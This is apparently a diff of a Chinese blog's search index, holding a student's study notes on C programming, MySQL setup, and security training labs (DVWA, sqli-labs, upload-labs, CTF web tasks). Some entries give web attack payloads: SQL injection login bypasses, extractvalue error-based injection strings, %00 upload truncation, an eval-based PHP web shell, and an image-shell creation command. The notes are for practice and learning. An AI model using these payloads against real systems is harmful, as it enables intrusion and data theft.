@@ -1,6 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>C语言求余问题</title>
+    <url>/2020/11/02/c/C%E6%B1%82%E4%BD%99%E5%BE%97%E5%90%84%E4%B8%AA%E4%BD%8D/</url>
+    <content><![CDATA[<h4 id="c语言中-a为一个四位数-那么a-1000-100是啥"><a href="#c语言中-a为一个四位数-那么a-1000-100是啥" class="headerlink" title="c语言中 a为一个四位数 那么a%1000/100是啥"></a>c语言中 a为一个四位数 那么a%1000/100是啥</h4><p>假设a的值为1345，那么当a%1000，值为345，那么345/100，结果就是3；<br>所以这个算法是用来取得这个四位数的百位数值</p>
+<p>同样的思想应用在水仙花数上，取百位，十位，个位上的数分别为</p>
+<p>a，b，c，d</p>
+<p>b=a/100；</p>
+<p>c=a/10%10;</p>
+<p>d=a%10;</p>
+]]></content>
+      <tags>
+        <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C语言注</title>
     <url>/2020/10/18/c/C%E8%AF%AD%E8%A8%80%E6%B3%A8/</url>
     <content><![CDATA[<p>1.(！flag) 等价于 (flag==0)<br>2.while(n)  是什么意思？<br>首先，n在这里被当作了一个条件<br>其次，当n为真时，进入while循环体（A）；否则跳出循环继续执行下面部分（B）。<br>while（n）<br>｛<br>循环体；//标识为A<br>｝<br>语句1；//标识为B<br>语句2；<br>3.如何用C语言将字符型数字转化成数值型数字<br>‘2’       通过     ‘2’ - ’0’ = 2<br>4.对于二维数组如何将什么上三角、下三角的值进行修改<br>考虑对角线很重要<br>比如 5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>正三角线：左到右，i=j<br>反三角线：右到左，i+j=n-1<br>取大于等于或者小于等于号时就可以实现上三角之类的数操作</p>
@@ -126,20 +140,6 @@
       </tags>
   </entry>
   <entry>
-    <title>C语言求余问题</title>
-    <url>/2020/11/02/c/C%E6%B1%82%E4%BD%99%E5%BE%97%E5%90%84%E4%B8%AA%E4%BD%8D/</url>
-    <content><![CDATA[<h4 id="c语言中-a为一个四位数-那么a-1000-100是啥"><a href="#c语言中-a为一个四位数-那么a-1000-100是啥" class="headerlink" title="c语言中 a为一个四位数 那么a%1000/100是啥"></a>c语言中 a为一个四位数 那么a%1000/100是啥</h4><p>假设a的值为1345，那么当a%1000，值为345，那么345/100，结果就是3；<br>所以这个算法是用来取得这个四位数的百位数值</p>
-<p>同样的思想应用在水仙花数上，取百位，十位，个位上的数分别为</p>
-<p>a，b，c，d</p>
-<p>b=a/100；</p>
-<p>c=a/10%10;</p>
-<p>d=a%10;</p>
-]]></content>
-      <tags>
-        <tag>c</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>函数递归</title>
     <url>/2020/11/14/c/%E5%87%BD%E6%95%B0%E9%80%92%E5%BD%92/</url>
     <content><![CDATA[<p> 递归思想</p>
@@ -193,6 +193,23 @@
       </tags>
   </entry>
   <entry>
+    <title>指针</title>
+    <url>/2020/11/08/c/%E6%8C%87%E9%92%88/</url>
+    <content><![CDATA[<p> 指针和指针变量</p>
+<p>char *pa;//  定义一个指向字符型的指针变量；</p>
+<p>int *pb;//   定义一个指向整型的指针变量；</p>
+<p>取地址运算符  &amp;</p>
+<p>取值运算符   *</p>
+<p>未理解的</p>
+<p>（now，a）</p>
+<p>( the addr of a is)</p>
+<p>避免访问未初始化的指针</p>
+]]></content>
+      <tags>
+        <tag>指针</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>水仙花数、素数</title>
     <url>/2020/10/31/c/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0%E3%80%81%E7%B4%A0%E6%95%B0/</url>
     <content><![CDATA[<p>   <strong>水仙花数</strong></p>
@@ -210,23 +227,6 @@
 ]]></content>
       <tags>
         <tag>c</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>指针</title>
-    <url>/2020/11/08/c/%E6%8C%87%E9%92%88/</url>
-    <content><![CDATA[<p> 指针和指针变量</p>
-<p>char *pa;//  定义一个指向字符型的指针变量；</p>
-<p>int *pb;//   定义一个指向整型的指针变量；</p>
-<p>取地址运算符  &amp;</p>
-<p>取值运算符   *</p>
-<p>未理解的</p>
-<p>（now，a）</p>
-<p>( the addr of a is)</p>
-<p>避免访问未初始化的指针</p>
-]]></content>
-      <tags>
-        <tag>指针</tag>
       </tags>
   </entry>
   <entry>
@@ -248,30 +248,81 @@
       </tags>
   </entry>
   <entry>
-    <title>1-5</title>
-    <url>/2021/02/18/dvwa/1-5/</url>
-    <content><![CDATA[<p>推荐文章：<a href="https://www.freebuf.com/articles/web/119467.html">https://www.freebuf.com/articles/web/119467.html</a></p>
-<h4 id="brute-force："><a href="#brute-force：" class="headerlink" title="brute force："></a>brute force：</h4><p> 1.如题暴力破解，采用burp suite字典进行猜测用户名和密码</p>
-<p> 2.使用“万能密码”：admin’ or’1’=’1</p>
-<h4 id="file-upload："><a href="#file-upload：" class="headerlink" title="file upload："></a>file upload：</h4><p>（这里直接去做一做uploads靶场会更有收获）</p>
-<p>看代码安全程度低，对于上传数据没有进行过滤，</p>
-<p>所以直接上传一句话木马，php文件进行连接。</p>
-<p>file upload1：1.抓包，修改数据：1.jpg更改为1.php上传，成功。</p>
-<p>../../hackable/uploads/1.php succesfully uploaded!</p>
-<p>​                2.采用%00截断的方法可以轻松绕过文件名的检查</p>
-<p>%00在url语言里代表空格“ ”，因此它起到的作用就是截断文件的后半段，让它识别到的文件格式是.jpg，而解析时会是前面的脚本格式,比如改包时1.php.jpg</p>
-<p>Sql:使用sqlmap跑的时候，因为自己的安装问题，执行命令必须以sqlmap.py -u的格式</p>
-<h4 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h4><p>暂时不太理解，所以另外去摘抄了其他博主内容作为文章。</p>
-<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>其实和之前在sql靶场学习的差不多，思路基本上是：</p>
-<p>爆字–爆段–报表–爆内容</p>
-<p>对于难度的区别的话，无非low等级可以直接输入句子查询，而medium等级之后完全可以抓包来实现语句查询（篡改）</p>
-<p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(44).png"></p>
-<p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(45).png"></p>
-<p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(46).png"></p>
-<p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(49).png"></p>
+    <title>涅普</title>
+    <url>/2021/02/14/nepnep/%E6%B6%85%E6%99%AE/</url>
+    <content><![CDATA[<p>涅普web2</p>
+<table>
+<thead>
+<tr>
+<th align="center"></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"></td>
+<td>前言：渗透测试  前提获得授权，类似于黑客方法。     测试分类：  黑盒测试和白盒测试</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td>PHP入门</td>
+<td>Php isset函数     Avws  xff    SSRF:一种安全漏洞</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>涅普web3</p>
+<p>Select 后加*是为了全输出</p>
+<p>Order by 3 第三类数据排序</p>
+<p>联合查询注入意思是结构一起输出</p>
+<p>-1可以忽略前面的数据</p>
+<p>布尔盲注只有两种情况：永真和永假</p>
+<p>phpstorm</p>
+<p>docker</p>
+<p>mysql文件读写</p>
+<p>Dnslog</p>
+<p>安全客</p>
+<p>推荐文章：</p>
+<p><a href="https://www.anquake.com/post/id/205376">https://www.anquake.com/post/id/205376</a> SQL注入基础整理及Trinks总结</p>
+<p><a href="https://yulige.top/?p=80">https://yulige.top/?p=80</a> 郁离歌师傅的SQL-LABS修炼笔记</p>
+<p><a href="https://xz.ali.com/t/7575">https://xz.ali.com/t/7575</a> sql盲注的效率分析</p>
+<p>涅普web4</p>
+<p>禁用Javascript校验</p>
+<p>content-type 验证</p>
+<p>封装协议读源码</p>
+<p>KAILI指令：</p>
+<p>创建文件夹步骤：<br>1.mkdir +desktop（路径）/ index(文件夹名）</p>
+<p>在桌面创建了一个index文件夹</p>
+<p>mkdir +123456 +desktop（路径）/ index.txt(文件夹名）</p>
+<p>在桌面创建了一个index.txt文件夹，但需要权限 123456 才能访问</p>
+<p>2.rm -(选项) +所要删除的文件绝对路径</p>
+<p>rm -r index</p>
+<p>将index的子目录及子目录以下的所有文件都删除</p>
+<p>创建文件步骤：<br>*1. touch + 11.txt(文件名)</p>
+<p>创建一个空文件</p>
+<p>\2. ls</p>
+<p>查看所有文件</p>
+<p>\3. vi 11.txt （vi亦可独立创建一个文件）</p>
+<p>vi为进入vim编辑器命令，其意在在vim编辑器编辑11.txt文件</p>
+<p>\4. i</p>
+<p>i 意为insert，意思是可以在里面插入并修改内容</p>
+<p>5.Esc</p>
+<p>退出编辑框，返回命令行</p>
+<p>6.编写完怎么保存文件呢？</p>
+<p>这些操作要保证是在命令模式下进行。</p>
+<p>1）保存并退出文件：” :wq “</p>
+<ol start="2">
+<li>如果只想保存文件 ：” :w “</li>
+</ol>
+<p>3）放弃所有文件修改：” :q! “</p>
 ]]></content>
       <tags>
-        <tag>dvwa</tag>
+        <tag>分享会</tag>
       </tags>
   </entry>
   <entry>
@@ -309,6 +360,33 @@
 
 <p>当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。</p>
 <p><a href="http://image.3001.net/images/20161031/14778955408376.png"><img src="http://image.3001.net/images/20161031/14778955408376.png!small" alt="1.png"></a> </p>
+]]></content>
+      <tags>
+        <tag>dvwa</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>1-5</title>
+    <url>/2021/02/18/dvwa/1-5/</url>
+    <content><![CDATA[<p>推荐文章：<a href="https://www.freebuf.com/articles/web/119467.html">https://www.freebuf.com/articles/web/119467.html</a></p>
+<h4 id="brute-force："><a href="#brute-force：" class="headerlink" title="brute force："></a>brute force：</h4><p> 1.如题暴力破解，采用burp suite字典进行猜测用户名和密码</p>
+<p> 2.使用“万能密码”：admin’ or’1’=’1</p>
+<h4 id="file-upload："><a href="#file-upload：" class="headerlink" title="file upload："></a>file upload：</h4><p>（这里直接去做一做uploads靶场会更有收获）</p>
+<p>看代码安全程度低，对于上传数据没有进行过滤，</p>
+<p>所以直接上传一句话木马，php文件进行连接。</p>
+<p>file upload1：1.抓包，修改数据：1.jpg更改为1.php上传，成功。</p>
+<p>../../hackable/uploads/1.php succesfully uploaded!</p>
+<p>​                2.采用%00截断的方法可以轻松绕过文件名的检查</p>
+<p>%00在url语言里代表空格“ ”，因此它起到的作用就是截断文件的后半段，让它识别到的文件格式是.jpg，而解析时会是前面的脚本格式,比如改包时1.php.jpg</p>
+<p>Sql:使用sqlmap跑的时候，因为自己的安装问题，执行命令必须以sqlmap.py -u的格式</p>
+<h4 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h4><p>暂时不太理解，所以另外去摘抄了其他博主内容作为文章。</p>
+<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>其实和之前在sql靶场学习的差不多，思路基本上是：</p>
+<p>爆字–爆段–报表–爆内容</p>
+<p>对于难度的区别的话，无非low等级可以直接输入句子查询，而medium等级之后完全可以抓包来实现语句查询（篡改）</p>
+<p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(44).png"></p>
+<p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(45).png"></p>
+<p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(46).png"></p>
+<p><img src="/2021/02/18/dvwa/1-5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(49).png"></p>
 ]]></content>
       <tags>
         <tag>dvwa</tag>
@@ -446,84 +524,6 @@ echo "Hello World!";
       </tags>
   </entry>
   <entry>
-    <title>涅普</title>
-    <url>/2021/02/14/nepnep/%E6%B6%85%E6%99%AE/</url>
-    <content><![CDATA[<p>涅普web2</p>
-<table>
-<thead>
-<tr>
-<th align="center"></th>
-<th></th>
-<th></th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center"></td>
-<td>前言：渗透测试  前提获得授权，类似于黑客方法。     测试分类：  黑盒测试和白盒测试</td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td align="center"></td>
-<td>PHP入门</td>
-<td>Php isset函数     Avws  xff    SSRF:一种安全漏洞</td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<p>涅普web3</p>
-<p>Select 后加*是为了全输出</p>
-<p>Order by 3 第三类数据排序</p>
-<p>联合查询注入意思是结构一起输出</p>
-<p>-1可以忽略前面的数据</p>
-<p>布尔盲注只有两种情况：永真和永假</p>
-<p>phpstorm</p>
-<p>docker</p>
-<p>mysql文件读写</p>
-<p>Dnslog</p>
-<p>安全客</p>
-<p>推荐文章：</p>
-<p><a href="https://www.anquake.com/post/id/205376">https://www.anquake.com/post/id/205376</a> SQL注入基础整理及Trinks总结</p>
-<p><a href="https://yulige.top/?p=80">https://yulige.top/?p=80</a> 郁离歌师傅的SQL-LABS修炼笔记</p>
-<p><a href="https://xz.ali.com/t/7575">https://xz.ali.com/t/7575</a> sql盲注的效率分析</p>
-<p>涅普web4</p>
-<p>禁用Javascript校验</p>
-<p>content-type 验证</p>
-<p>封装协议读源码</p>
-<p>KAILI指令：</p>
-<p>创建文件夹步骤：<br>1.mkdir +desktop（路径）/ index(文件夹名）</p>
-<p>在桌面创建了一个index文件夹</p>
-<p>mkdir +123456 +desktop（路径）/ index.txt(文件夹名）</p>
-<p>在桌面创建了一个index.txt文件夹，但需要权限 123456 才能访问</p>
-<p>2.rm -(选项) +所要删除的文件绝对路径</p>
-<p>rm -r index</p>
-<p>将index的子目录及子目录以下的所有文件都删除</p>
-<p>创建文件步骤：<br>*1. touch + 11.txt(文件名)</p>
-<p>创建一个空文件</p>
-<p>\2. ls</p>
-<p>查看所有文件</p>
-<p>\3. vi 11.txt （vi亦可独立创建一个文件）</p>
-<p>vi为进入vim编辑器命令，其意在在vim编辑器编辑11.txt文件</p>
-<p>\4. i</p>
-<p>i 意为insert，意思是可以在里面插入并修改内容</p>
-<p>5.Esc</p>
-<p>退出编辑框，返回命令行</p>
-<p>6.编写完怎么保存文件呢？</p>
-<p>这些操作要保证是在命令模式下进行。</p>
-<p>1）保存并退出文件：” :wq “</p>
-<ol start="2">
-<li>如果只想保存文件 ：” :w “</li>
-</ol>
-<p>3）放弃所有文件修改：” :q! “</p>
-]]></content>
-      <tags>
-        <tag>分享会</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php木马</title>
     <url>/2021/02/19/php/php%E6%9C%A8%E9%A9%AC/</url>
     <content><![CDATA[<p>PHP一句话木马：<br>   \1. eval():   <?php @eval($_POST['hacker']); ?>   eval函数将接受的字符串当做代码执行</p>
@@ -574,33 +574,6 @@ echo "Hello World!";
 ]]></content>
       <tags>
         <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>11-20</title>
-    <url>/2021/02/18/sql/11-20/</url>
-    <content><![CDATA[<h4 id="第十三关："><a href="#第十三关：" class="headerlink" title="第十三关："></a>第十三关：</h4><p>奇怪的是，我的回显和作者的不一样，直接admin’)#当用户名作万能密码。</p>
-<p>SELECT username, password FROM users WHERE username=(‘admin’)#’) and password=(‘123’) LIMIT 0,1</p>
-<p>但是#改成–+却不行</p>
-<h4 id="第十四关：双引号"><a href="#第十四关：双引号" class="headerlink" title="第十四关：双引号"></a>第十四关：双引号</h4><p>SELECT username, password FROM users WHERE username=”admin”#” and password=”123” LIMIT 0,1</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-14/">http://127.0.0.1/sqllib/Less-14/</a> </p>
-<h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关:"></a>第十五关:</h4><p>SELECT username, password FROM users WHERE username=’admin’#’ and password=’123’ LIMIT 0,1</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-15/">http://127.0.0.1/sqllib/Less-15/</a> </p>
-<h4 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h4><p>SELECT username, password FROM users WHERE username=(“admin”)#”) and password=(“123”) LIMIT 0,1</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-16/">http://127.0.0.1/sqllib/Less-16/</a> </p>
-<h4 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h4><p>SELECT username, password FROM users WHERE username= ‘admin’ LIMIT 0,1</p>
-<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-17/">http://127.0.0.1/sqllib/Less-17/</a> </p>
-<h4 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h4><p>Your IP ADDRESS is: 127.0.0.1</p>
-<p>SELECT users.username, users.password FROM users WHERE users.username=’admin’ and users.password=1 ORDER BY users.id DESC LIMIT 0,1Your User Agent is: ‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1</p>
-<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-18/">http://127.0.0.1/sqllib/Less-18/</a> </p>
-<h4 id="第二十关："><a href="#第二十关：" class="headerlink" title="第二十关："></a>第二十关：</h4><p><strong>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</strong></p>
-<p>YOUR COOKIE : uname = admin1’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# and expires: Tue 16 Feb 2021 - 13:36:07<br>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</p>
-<p>来自 <a href="http://127.0.0.1/sqllib/Less-20/index.php">http://127.0.0.1/sqllib/Less-20/index.php</a> </p>
-]]></content>
-      <tags>
-        <tag>sql靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -755,22 +728,30 @@ echo "Hello World!";
       </tags>
   </entry>
   <entry>
-    <title>Mysql</title>
-    <url>/2020/12/01/sql/Mysql/</url>
-    <content><![CDATA[<p>  关于MySQL的安装</p>
-<p>再次尝试运行Mysql，却发现没有指令运行，翻阅文章才恍然大悟：没有先配置环境变量!</p>
-<p>配置环境变量的话，先找到MySQL的bin文件，复制黏贴文件路径</p>
-<p>然后寻找计算机高级管理系统（从设置里的关于找），打开后找到环境变量，双击path，添加新路径；</p>
-<p>这样就能在cmd上运行；</p>
-<p>新建 my.ini文件，添加配置编码</p>
-<p>接着以管理员打开cmd窗口，然后输入 mysqld –install 这样就将mysqld添加到系统服务了。</p>
-<p>win+r 打开运行窗口，输入services.msc，这样可以看MySQL是否已经添加加到windosws服务</p>
-<p>用命令 mysql -uroot -p执行</p>
-<p>net stop mysql 关闭服务    net start mysql 开启服务。</p>
-<p>附加：暂时造成无法通过小皮面板打开MySQL</p>
+    <title>11-20</title>
+    <url>/2021/02/18/sql/11-20/</url>
+    <content><![CDATA[<h4 id="第十三关："><a href="#第十三关：" class="headerlink" title="第十三关："></a>第十三关：</h4><p>奇怪的是，我的回显和作者的不一样，直接admin’)#当用户名作万能密码。</p>
+<p>SELECT username, password FROM users WHERE username=(‘admin’)#’) and password=(‘123’) LIMIT 0,1</p>
+<p>但是#改成–+却不行</p>
+<h4 id="第十四关：双引号"><a href="#第十四关：双引号" class="headerlink" title="第十四关：双引号"></a>第十四关：双引号</h4><p>SELECT username, password FROM users WHERE username=”admin”#” and password=”123” LIMIT 0,1</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-14/">http://127.0.0.1/sqllib/Less-14/</a> </p>
+<h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关:"></a>第十五关:</h4><p>SELECT username, password FROM users WHERE username=’admin’#’ and password=’123’ LIMIT 0,1</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-15/">http://127.0.0.1/sqllib/Less-15/</a> </p>
+<h4 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h4><p>SELECT username, password FROM users WHERE username=(“admin”)#”) and password=(“123”) LIMIT 0,1</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-16/">http://127.0.0.1/sqllib/Less-16/</a> </p>
+<h4 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h4><p>SELECT username, password FROM users WHERE username= ‘admin’ LIMIT 0,1</p>
+<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-17/">http://127.0.0.1/sqllib/Less-17/</a> </p>
+<h4 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h4><p>Your IP ADDRESS is: 127.0.0.1</p>
+<p>SELECT users.username, users.password FROM users WHERE users.username=’admin’ and users.password=1 ORDER BY users.id DESC LIMIT 0,1Your User Agent is: ‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1</p>
+<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-18/">http://127.0.0.1/sqllib/Less-18/</a> </p>
+<h4 id="第二十关："><a href="#第二十关：" class="headerlink" title="第二十关："></a>第二十关：</h4><p><strong>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</strong></p>
+<p>YOUR COOKIE : uname = admin1’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# and expires: Tue 16 Feb 2021 - 13:36:07<br>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</p>
+<p>来自 <a href="http://127.0.0.1/sqllib/Less-20/index.php">http://127.0.0.1/sqllib/Less-20/index.php</a> </p>
 ]]></content>
       <tags>
-        <tag>sql</tag>
+        <tag>sql靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -809,14 +790,22 @@ echo "Hello World!";
       </tags>
   </entry>
   <entry>
-    <title>进阶区</title>
-    <url>/2021/02/05/web/9-12/</url>
-    <content><![CDATA[<h4 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h4><p>老套路</p>
-<h4 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h4><p>访问index.php,跳转后回到页面，考虑使用抓包，进行repeater，go后在头部看到 flag。</p>
-<h4 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h4><p>神奇的PHPv5框架存在漏洞利用，采用路径更改（像Linux指令）进行访问</p>
+    <title>Mysql</title>
+    <url>/2020/12/01/sql/Mysql/</url>
+    <content><![CDATA[<p>  关于MySQL的安装</p>
+<p>再次尝试运行Mysql，却发现没有指令运行，翻阅文章才恍然大悟：没有先配置环境变量!</p>
+<p>配置环境变量的话，先找到MySQL的bin文件，复制黏贴文件路径</p>
+<p>然后寻找计算机高级管理系统（从设置里的关于找），打开后找到环境变量，双击path，添加新路径；</p>
+<p>这样就能在cmd上运行；</p>
+<p>新建 my.ini文件，添加配置编码</p>
+<p>接着以管理员打开cmd窗口，然后输入 mysqld –install 这样就将mysqld添加到系统服务了。</p>
+<p>win+r 打开运行窗口，输入services.msc，这样可以看MySQL是否已经添加加到windosws服务</p>
+<p>用命令 mysql -uroot -p执行</p>
+<p>net stop mysql 关闭服务    net start mysql 开启服务。</p>
+<p>附加：暂时造成无法通过小皮面板打开MySQL</p>
 ]]></content>
       <tags>
-        <tag>攻防世界_web</tag>
+        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
@@ -840,6 +829,87 @@ echo "Hello World!";
 ]]></content>
       <tags>
         <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>进阶区</title>
+    <url>/2021/02/05/web/9-12/</url>
+    <content><![CDATA[<h4 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h4><p>老套路</p>
+<h4 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h4><p>访问index.php,跳转后回到页面，考虑使用抓包，进行repeater，go后在头部看到 flag。</p>
+<h4 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h4><p>神奇的PHPv5框架存在漏洞利用，采用路径更改（像Linux指令）进行访问</p>
+]]></content>
+      <tags>
+        <tag>攻防世界_web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>图片马</title>
+    <url>/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/</url>
+    <content><![CDATA[<p>  1.打开windows命令控制台，cd到图片与文件同在路径下</p>
+<p>  如 1.jpg与 2.php同在桌面，则：</p>
+<p>  cd   desktop</p>
+<ol start="2">
+<li><p>输入指令：copy  1.jpg/b  +  2.php/a  shell,jpg   之后回车，那么形成的图片马文件就会出现在自己的桌面上。</p>
+<p><img src="/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(38).png"></p>
+<p>​    </p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>upload-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>新手区</title>
+    <url>/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
+    <content><![CDATA[<h4 id="View-source"><a href="#View-source" class="headerlink" title="View_source"></a>View_source</h4><p>直接进入查看器查看；</p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(59).png"></p>
+<h4 id="Get-post"><a href="#Get-post" class="headerlink" title="Get_post"></a>Get_post</h4><p>浅谈HTTP中GET、POST用法以及它们的区别</p>
+<p>来自 <a href="https://www.cnblogs.com/williamjie/p/9099940.html">https://www.cnblogs.com/williamjie/p/9099940.html</a> </p>
+<p>解题过程：get ：在路径后直接添加?a=1;</p>
+<p>​           post: 勾选post data ，填入b=2.</p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(73).png"></p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(75).png"></p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(76).png"></p>
+<h4 id="Robots"><a href="#Robots" class="headerlink" title="Robots"></a>Robots</h4><p>1.查看协议：路径后添加robots.txt来查看；</p>
+<p>2.发现得到语句:</p>
+<p>User-agent: *<br>Disallow:<br>Disallow: f1ag_1s_h3re.php</p>
+<p>(此地无银) 直接构造语句来访问网站根目录下.php文件</p>
+<p>添加f1ag_1s_h3re.php。</p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(60).png"></p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(61).png"></p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(62).png"></p>
+<h4 id="Backup"><a href="#Backup" class="headerlink" title="Backup"></a>Backup</h4><p>php的备份有两种：*.php~和*.php.bak</p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(63).png"></p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(64).png"></p>
+<p>来自 <a href="https://www.cnblogs.com/yunqian2017/p/11515443.html">https://www.cnblogs.com/yunqian2017/p/11515443.html</a> </p>
+<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>抓包配合火狐使用</p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(65).png"></p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(66).png"></p>
+<p><img src="/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(67).png"></p>
+<p>来自 &lt;<a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=0&amp;id=5069&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=0&amp;id=5069&amp;page=1</a></p>
+<h4 id="Disabled-button"><a href="#Disabled-button" class="headerlink" title="Disabled_button"></a>Disabled_button</h4><p>直接编辑修改：题目为disabled那就用小聪明将它改成abled。</p>
